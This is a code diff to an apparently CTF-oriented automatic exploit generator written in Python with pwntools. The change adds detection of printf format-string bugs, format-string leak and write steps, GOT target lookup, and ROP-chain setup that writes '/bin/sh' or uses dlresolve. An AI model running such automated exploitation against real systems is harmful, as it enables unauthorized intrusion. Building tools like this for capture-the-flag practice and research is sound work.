@@ -3,7 +3,6 @@ import logging
 import argparse
 import os
 
-# from rage.log import aegis_log
 from pwn import *
 from rage.rage import rAEG
 from rage.machine import Machine
@@ -18,6 +17,7 @@ class Aegis:
         self.binary = os.path.abspath(binary)
         self.elf = ELF(binary)
         self.rop = ROP(self.elf)
+
         if libc is not None:
             self.libc = ELF(libc)
         else:
@@ -25,13 +25,10 @@ class Aegis:
 
         self.ip = ip
         self.port = port
-        self.has_leak = False
-        self.has_overflow = False
-        self.has_libc_leak = False
+        self.has_format = False
 
         self.symbol = rAEG(self.binary)
         self.machine = Machine(self.binary)
-        self.failed = False
         
         self.static_analysis() 
         self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)
@@ -44,11 +41,18 @@ class Aegis:
         self.machine.check_mitigations()
         self.machine.check_vulnerable_copy()
         self.machine.check_vulnerable_input()
+        printf_addrs = self.machine.check_vulnerable_printf()
+        if len(printf_addrs) > 0:
+            got = self.machine.find_target_got_functions(printf_addrs[0]) 
+            aegis_log.info(f"Found got functions {got}")
 
     def symbolic_analysis(self):
         """Set variables from the output of the symbolic analysis."""
         self.symbol.stack_smash()
         self.symbolic_padding = self.symbol.symbolic_padding
+        self.has_format = self.symbol.has_format
+        if self.has_format == True:
+            aegis_log.info(f"Found printf format string vulnerability")
 
     def setup_exploit(self):
         """Choose which exploit to do for the binary."""
@@ -56,7 +60,6 @@ class Aegis:
         win_gadget = self.machine.find_win_gadget()
         function = self.machine.find_functions(["win", "system", "execve", "syscall"])
         string = self.machine.find_string_address()
-        printf_addresses = self.machine.check_vulnerable_printf()
         self.against.chain = b""
         writeable = None
 
@@ -69,15 +72,23 @@ class Aegis:
         if self.symbolic_padding != None:
             #if self.machine.padding_size == len(self.symbolic_padding):
             self.against.padding = self.symbolic_padding
-            if self.failed:
-                self.against.padding = b"A" * self.machine.padding_size
+            #if self.failed:
+                #self.against.padding = b"A" * self.machine.padding_size
         else:
             self.against.padding = b"A" * self.machine.padding_size
 
         if len(self.against.padding) == 0:
             aegis_log.warning(f"Could not find buffer overflow")
-            if printf_addresses:
+            if self.has_format == True:
                 self.against.format_leak()
+
+                if self.against.flag == None:
+                    if win_gadget:
+                        self.against.format_write()
+                else:
+                    aegis_log.info(f"Found flag through stack leak: {self.against.flag}")
+                    
+
         else: 
             if not string:
                 self.against.chain += self.against.rop_chain_write_string(b"/bin/sh", writeable)
@@ -116,6 +127,7 @@ class Aegis:
                 elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                     aegis_log.info(f"Setting up return to dlresolve")
                     self.against.chain = self.against.rop_chain_dlresolve()
+            self.exploit()
                 
 
 
@@ -237,7 +249,7 @@ if __name__ == "__main__":
 
     parser.add_argument("-bin", metavar="binary", type=str, help="The binary that is to be exploited", default=None)
     parser.add_argument("-libc", metavar="libc", type=str, help="The libc shared library object linked to the binary", default=None)
-    parser.add_argument("-ip", metavar="ip", type=str, help="The ip address of the remote challenge", default=None)
+    parser.add_argument("-ip", metavar="ip", type=str, help="The ip address of the remote challenge or connection info", default=None)
     parser.add_argument("-port", metavar="port", type=str, help="The port of the remote challenge", default=None)
     parser.add_argument("-login", metavar="login", type=str, help="Your login to your ctfd account", default=None)
     parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
@@ -250,4 +262,3 @@ if __name__ == "__main__":
     aeg.static_analysis()
     aeg.symbolic_analysis()
     aeg.setup_exploit()
-    aeg.exploit()
